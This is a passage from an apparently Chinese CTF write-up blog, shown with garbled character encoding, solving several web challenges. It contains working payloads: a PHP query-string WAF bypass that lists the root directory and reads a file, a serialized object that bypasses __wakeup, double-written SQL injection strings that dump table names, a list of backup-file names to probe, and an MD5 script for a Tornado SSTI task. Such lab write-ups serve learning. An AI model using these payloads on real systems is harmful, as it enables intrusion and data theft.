åªèƒ½æ˜¯æ•°å­—ã€‚æ‰€ä»¥è¿™é‡Œè¿ç”¨åˆ°äº†<code>phpå­—ç¬¦ä¸²è§£æç‰¹æ€§</code>ï¼š</p><p>æˆ‘ä»¬çŸ¥é“PHPå°†æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆåœ¨URLæˆ–æ­£æ–‡ä¸­ï¼‰è½¬æ¢ä¸ºå†…éƒ¨$_GETæˆ–çš„å…³è”æ•°ç»„$_POSTã€‚ä¾‹å¦‚ï¼š/?foo=barå˜æˆArray([foo] =&gt; â€œbarâ€)ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²åœ¨è§£æçš„è¿‡ç¨‹ä¸­ä¼šå°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–ç”¨ä¸‹åˆ’çº¿ä»£æ›¿ã€‚ä¾‹å¦‚ï¼Œ/?%20news[id%00=42ä¼šè½¬æ¢ä¸ºArray([news_id] =&gt; 42)ã€‚å¦‚æœä¸€ä¸ªIDS/IPSæˆ–WAFä¸­æœ‰ä¸€æ¡è§„åˆ™æ˜¯å½“news_idå‚æ•°çš„å€¼æ˜¯ä¸€ä¸ªéæ•°å­—çš„å€¼åˆ™æ‹¦æˆªï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨ä»¥ä¸‹è¯­å¥ç»•è¿‡ï¼š</p><pre class="line-numbers language-none"><code class="language-none">/news.php?%20news[id%00=42"+AND+1=0--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š</p><blockquote><p>â€‹    1.åˆ é™¤ç©ºç™½ç¬¦</p><p>â€‹    2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰</p></blockquote><p>å…·ä½“å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p><p>æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥æ„é€ payload: /calc.php? num=aï¼Œå¯ä»¥å‘ç°æ­¤æ—¶é¡µé¢èƒ½å¤Ÿå›æ˜¾ï½ï¼Œè¿™é‡Œåœ¨numå‰é¢åŠ äº†ç©ºæ ¼ï¼ŒWAFæ£€æµ‹çš„æ˜¯numï¼Œä½†æ˜¯æˆ‘ä»¬è¾“å…¥çš„æ˜¯â€˜ã€€numâ€™ï¼Œæ‰€ä»¥å°±ç»•è¿‡äº†WAFï¼Œä½†æ˜¯PHPåœ¨è§£æçš„æ—¶å€™ä¼šåˆ é™¤ç©ºç™½å­—ç¬¦ï¼Œå°±ä¼šå­˜å‚¨ä¸ºArray([num] =&gt; â€œï½â€)ï¼ŒåŒæ—¶å®ç°äº†ç»™numèµ‹éæ•°å­—å€¼ã€‚è¿™æ ·å°±è¿‡äº†ç¬¬ä¸€å…³ã€‚</p><p>ä¸‹ä¸€ä¸ªæ˜¯ç»•è¿‡æ­£åˆ™åŒ¹é…äº†ï¼Œæœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><ol><li>ä½¿ç”¨chr()ç»•è¿‡ï¼Œå°†asciiç è½¬æˆå•ä¸ªå­—ç¬¦ä¸²åœ¨ç”¨<code>.</code>æ‹¼æ¥ã€‚</li><li>ä½¿ç”¨å­—ç¬¦å–åç»•è¿‡ï¼Œå¦‚<code>~%9e</code>å°±ä»£è¡¨å­—ç¬¦ä¸²<code>a</code>ã€‚</li></ol><pre class="line-numbers language-none"><code class="language-none">è¿™é‡Œ/=chr(47)?%20num=var_dump(scandir(chr(47)))ã€€ã€€// åˆ—å‡ºæ ¹ç›®å½•ä¸‹çš„å…¨éƒ¨æ–‡ä»¶å ?%20num=var_dump(file_get_contents(~%D0%99%CE%9E%98%98))ã€€// è¯»flagæ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œçš„å–åå°±æ˜¯å°†äºŒè¿›åˆ¶0å˜ä¸º1ï¼Œ1å˜ä¸º0ï¼Œå…·ä½“å®ç°å°±å¦‚ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201251409604.png"></p><p>æ‰€ä»¥æˆ‘ä»¬åœ¨è¯»çš„æ—¶å€™<font color="#FF5E3A" size="3">å†å–åä¸€æ¬¡</font>å°±æ˜¯ç­‰ä»·äºè¯»f1aggã€‚</p><p>è¿˜æœ‰ä¸€äº›ç»•è¿‡æŠ€å·§è§ï¼š<a href="https://www.hetianlab.com/specialized/20201124173456">https://www.hetianlab.com/specialized/20201124173456</a></p><p>è¿™é‡Œè¿˜æœ‰å¦å¤–ä¸€ç§æ–¹æ³•HTTPèµ°ç§ï¼Œå…·ä½“å¯è§ï¼š</p><p><a href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></p><p><a href="https://baijiahao.baidu.com/s?id=1715478145881946407&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1715478145881946407&amp;wfr=spider&amp;for=pc</a></p><h2 id="16-æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#16-æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="16.[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>16.[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h2><p>æ‰“å¼€é¢˜ç›®æ˜¯å¯çˆ±çš„çŒ«çŒ«ï¼Œå…ˆé€—ä¼šçŒ«åœ¨åšé¢˜å“ˆå“ˆâ€¦â€¦é¢˜ç›®æç¤ºæœ‰æ–‡ä»¶å¤‡ä»½ï¼Œé‚£å°±ç›´æ¥å¼€æ‰«ï¼Œé‡è§åˆ«ç”¨äº†å¥½æ‹‰æ‰«ä¸åˆ°ï¼Œç”¨dirsearchæ‰«åˆ°<a href="http://www.zipï¼Œç›´æ¥è®¿é—®ä¸‹è½½åˆ°æºç ï¼Œçœ‹åˆ°flag.phpï¼Œå“¦~å‡çš„:ç‹—å¤´:ï¼Œé‚£å°±åˆ†ææºç ï¼š">www.zipï¼Œç›´æ¥è®¿é—®ä¸‹è½½åˆ°æºç ï¼Œçœ‹åˆ°flag.phpï¼Œå“¦~å‡çš„:ç‹—å¤´:ï¼Œé‚£å°±åˆ†ææºç ï¼š</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">include</span> <span class="token single-quoted-string string">'class.php'</span><span class="token punctuation">;</span>    <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„çœ‹åˆ°index.phpé‡Œæœ‰å‚æ•°ä¼ å…¥ï¼Œå¹¶ä¸”æœ‰ååºåˆ—åŒ–ï¼Œå†çœ‹class.php:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">username</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ€»çš„è¯»ä¸‹æ¥è¦æƒ³æ‹¿åˆ°flagï¼Œå°±å¾—è®©password=100,username=admin,å¯ä»¥çœ‹åˆ°ç›´æ¥ååºåˆ—åŒ–è‚¯å®šä¸è¡Œï¼Œè¿™é‡Œæœ‰__wakeupå‡½æ•°ï¼Œæ‰€ä»¥è¦ç»•è¿‡ï¼Œç»•è¿‡æŠ€å·§å°±æ˜¯è®©åºåˆ—åŒ–åçš„å±æ€§å€¼å¤§äºåŸæœ¬çš„å±æ€§å€¼ä¸ªæ•°ï¼Œå…·ä½“æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"100"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">':2:'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">':3:'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ç»•è¿‡__wakeup</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥ä¼ å‚å¾—åˆ° flag{bf2e4c0e-baf2-4f7f-81a1-0c4857a3366c}</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201251409606.png" alt="å¯çˆ±çŒ«çŒ«"></p><h2 id="17-æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#17-æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="17.[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>17.[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h2><p>è¿™ä¸ªSQLæ³¨å…¥ç›¸æ¯”è¾ƒä¹‹å‰çš„å°±æ˜¯å¤šäº†è¿‡æ»¤è®¾ç½®ï¼Œè€Œä¸”è¿™é‡Œä¸»è¦è€ƒå¯Ÿçš„<strong>åŒå†™ç»•è¿‡</strong>ï¼Œå…¶ä¸­åšé¢˜å®¹æ˜“å¿½ç•¥çš„ä¸€ç‚¹å°±æ˜¯å‰é¢è¿‡æ»¤çš„åé¢ç»™å¿˜äº†hh:</p><p>1.åˆ¤æ–­æ³¨å…¥ç‚¹ï¼Œå†å¯†ç ä½ç½®è¾“å…¥<code>1'</code>ï¼Œå‘ç°æŠ¥é”™ï¼Œè¯´æ˜å­˜åœ¨SQLæ³¨å…¥ã€‚</p><p>2.æ¥ç€åˆ¤æ–­å­—æ®µæ•°ï¼Œä½¿ç”¨<code>order by 8 # </code>ï¼Œå‘ç°æŠ¥é”™ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201251409607.png"></p><p>çœ‹åˆ°<code>or</code>å’Œ<code>by</code>æ²¡äº†ï¼Œè¯´æ˜è¢«è¿‡æ»¤äº†ï¼Œæ‹¿è¿‡æ»¤ä»€ä¹ˆå°±åŒå†™ä»€ä¹ˆæ”¹ä¸ºï¼š<code>oorrder bbyy 4 #</code>ï¼Œæ¥ç€æ”¹ä¸º3å°±å¯¹äº†è¯´æ˜æ˜¯ä¸‰æ®µã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201251409608.png"></p><p>3.çœ‹å›æ˜¾å“ªéƒ¨åˆ†: <code>union select 1,2,3</code>ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201251409609.png"></p><p>çœ‹åˆ°<code>union,select</code>ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œå†æ”¹ï¼š<code>1' ununionion selselectect 1,2,3 # </code>:</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201251409610.png"></p><p>4.æ¥ä¸‹æ¥å°±æ˜¯æ­£å¸¸æ­¥éª¤äº†ï¼ŒæŸ¥åº“åï¼š<code>1' ununionion seselectlect 1,database(),3 #</code>å¾—åˆ°ä½¿ç”¨çš„æ˜¯<code>geek</code>ï¼Œé‚£å°±å…ˆæ¥ç€æŸ¥</p><p>5.æŸ¥è¡¨å<code>1' ununionion seselectlect 1,(seselectlect group_concat(table_name) from information_schema.tables where table_schema='geek'),3 #</code>,æœ€å‘çš„æ¥äº†ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201251409611.png"></p><p>å‘ç°<code>where</code>å’Œ<code>.tables</code>å‰é¢çš„æ²¡äº†ï¼Œè¿™é‡Œè®°å¾—<code>information</code>é‡Œé¢æœ‰<code>or</code>!!!ï¼Œç»™è¿‡æ»¤äº†ï¼ŒåŒæ—¶ä¹‹åçœ‹åˆ°fromä¹Ÿç»™è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä¿®æ”¹ä¹‹åä¸ºï¼š</p><p><code>1' ununionion seselectlect 1,(seselectlect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='geek'),3 #</code>ï¼Œå°±å¾—åˆ°è¡¨åäº†ï¼Œä¹‹åå°±æ²¡å•¥æ–°çš„è¿‡æ»¤äº†ï¼Œæœ€åå¾—åˆ°flagã€‚</p><h2 id="18-ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#18-ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="18.[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>18.[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h2><p>è¿™é¢˜è€ƒæŸ¥çš„ä¸»è¦æ˜¯<strong>æºç æ³„éœ²</strong>ä»¥åŠ<strong>å¼±ç±»å‹æ¯”è¾ƒ</strong>ã€‚</p><p>ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶ï¼šç®¡ç†å‘˜å°†ç½‘ç«™æºä»£ç å¤‡ä»½åœ¨Webç›®å½•ä¸‹ï¼Œæ”»å‡»è€…é€šè¿‡çŒœè§£æ–‡ä»¶è·¯å¾„ï¼Œä¸‹è½½å¤‡ä»½æ–‡ä»¶ï¼Œå¯¼è‡´æºä»£ç æ³„éœ²ã€‚å¸¸è§çš„å¤‡ä»½æ–‡ä»¶åç¼€ï¼š</p><pre class="line-numbers language-none"><code class="language-none">.index.php.swpindex.php.swpindex.php.bak  //æœ¬é¢˜æç¤ºçš„bakå¤‡ä»½æ–‡ä»¶.index.php~index.php.bak_Edietplusindex.php.~index.php.~1~index.phpindex.php~index.php.rarindex.php.zipindex.php.7zindex.php.tar.gzwww.zipwww.rarwww.zipwww.7zwww.tar.gzwww.tarweb.zipweb.rarweb.zipweb.7zweb.tar.gzweb.tarwwwroot.rarweb.rar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸‹æ¥ä¹‹åå°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªindex.php.bakå¤‡ä»½æ–‡ä»¶ï¼Œçœ‹åˆ°æºç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Just num!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Try to find out source file!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çŸ¥é“æ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼šå¯¹æ•°æ®çš„ç±»å‹è¦æ±‚å¹¶ä¸ä¸¥æ ¼ï¼Œå¯ä»¥è®©æ•°æ®ç±»å‹äº’ç›¸è½¬æ¢ã€‚</p><p><strong>â€œ==â€ç±»å‹è½¬æ¢çš„è§„åˆ™</strong>ï¼š</p><p>1ã€å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒï¼Œ<font color="#FF5E3A" size="3">å­—ç¬¦ä¸²ä¼šè‡ªåŠ¨è¢«è½¬æ¢æˆæ•°å­—</font>ã€‚</p><p>â€‹        â€œadminâ€==0(true)ï¼šadminè¢«è½¬æ¢æˆæ•°å­—ï¼Œç”±äºadminæ˜¯å­—ç¬¦ä¸²ï¼Œè½¬æ¢å¤±è´¥ï¼Œintï¼ˆadminï¼‰=0ï¼Œæ‰€ä»¥æ¯”è¾ƒç»“æœæ˜¯trueã€‚</p><p>2ã€æ··åˆå­—ç¬¦ä¸²è½¬æ¢æˆæ•°å­—ï¼Œçœ‹å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">â€œ<span class="token number">1</span>adminâ€ <span class="token operator">==</span> <span class="token number">1</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç±»ä¼¼çš„è¿˜æœ‰MD5å¼±ç±»å‹æ¯”è¾ƒç­‰ã€‚æ‰€ä»¥payloadå°±ä¸ºï¼š<code>index.php?key=123</code>ï¼Œå¾—åˆ°flag{0951de20-f469-458f-8e3b-ffc4d519580a}</p><h2 id="19-æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#19-æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="19.[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>19.[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><p>ä¸»è¦è€ƒå¯Ÿçš„æ˜¯<font color="#FF5E3A" size="3">æ¨¡æ¿æ³¨å…¥</font></p><p>ç›¸å…³å­¦ä¹ ï¼š<a href="https://www.cnblogs.com/wjw-zm/p/12741047.html">Python-æ¨¡æ¿æ³¨å…¥ - ZMæ€ - åšå®¢å›­</a></p><p>é¦–å…ˆæ ¹æ®<code>easy_tornado</code>å’Œ<code>render</code>å‡½æ•°å¯çŸ¥è¿™ä¸ªé¢˜å’ŒæœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥æœ‰å…³ã€‚å› ä¸º<a href="https://so.csdn.net/so/search?q=render&amp;spm=1001.2101.3001.7020">render</a>ï¼ˆï¼‰æ˜¯tornadoé‡Œçš„å‡½æ•°ï¼Œå¯ä»¥ç”Ÿæˆhtmlæ¨¡æ¿ã€‚tornadoæ˜¯ç”¨Pythonç¼–å†™çš„WebæœåŠ¡å™¨å…¼Webåº”ç”¨æ¡†æ¶ï¼Œç®€å•æ¥è¯´å°±æ˜¯ç”¨æ¥ç”Ÿæˆæ¨¡æ¿çš„ä¸œè¥¿ã€‚å’ŒPythonç›¸å…³ï¼Œå’Œæ¨¡æ¿ç›¸å…³ï¼Œå°±å¯ä»¥æ¨æµ‹è¿™å¯èƒ½æ˜¯ä¸ªsstiæ³¨å…¥é¢˜äº†ã€‚ï¼ˆè¯¦æƒ…è¯·çœ‹<a href="https://blog.csdn.net/zz_Caleb/article/details/96480967">SSTIå®Œå…¨å­¦ä¹ </a>ï¼‰ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202202041535246.png" alt="éªŒè¯"></p><p>ä½†æ˜¯ç›®å‰è¿˜ç¼ºä¸€ä¸ª<code>cookie_secret</code>ï¼Œè¿™æ˜¯å°±å¯ä»¥æŸ¥è¿™ä¸ªä¸€èˆ¬åœ¨æ¨¡æ¿æ¡†æ¶çš„ä»€ä¹ˆä½ç½®ï¼Œé€šè¿‡æŸ¥é˜…å‘ç°åœ¨handler.settingsä¸­ï¼Œè¯¦ç»†è¯´æ˜è§ï¼š</p><p><a href="https://blog.csdn.net/weixin_45642610/article/details/112519061">https://blog.csdn.net/weixin_45642610/article/details/112519061</a></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202202041535249.png" alt="handler.settings"></p><p>è¿™æ ·å°±å¾—åˆ°å¯†é’¥äº†ï¼Œå°±å¯ä»¥æ ¹æ®å…¬å¼æ‹¿flagäº†ã€‚è¿™é‡Œè´´ä¸Šmd5åŠ å¯†è„šæœ¬ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token builtin">hash</span> <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#åˆ›å»ºmd5åŠ å¯†å¯¹è±¡</span><span class="token builtin">hash</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">"/fllllllllllllag"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#æ›´æ–°å¯¹è±¡è¦åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œè¦å…ˆUTF-8ç¼–ç æˆäºŒè¿›åˆ¶ï¼Œå› ä¸ºmd5åªåŠ å¯†äºŒè¿›åˆ¶</span>s1<span class="token operator">=</span><span class="token builtin">hash</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#ä»¥åå…­è¿›åˆ¶è¾“å‡ºå¯†æ–‡</span><span class="token builtin">hash</span> <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#æŒ‰è¦æ±‚é‡å¤æ­¥éª¤</span><span class="token builtin">hash</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"88418b16-e8cf-4a57-9b43-2abd81796dea"</span><span class="token operator">+</span>s1<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hash</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="20-æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#20-æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="20.[æå®¢å¤§æŒ‘æˆ˜ 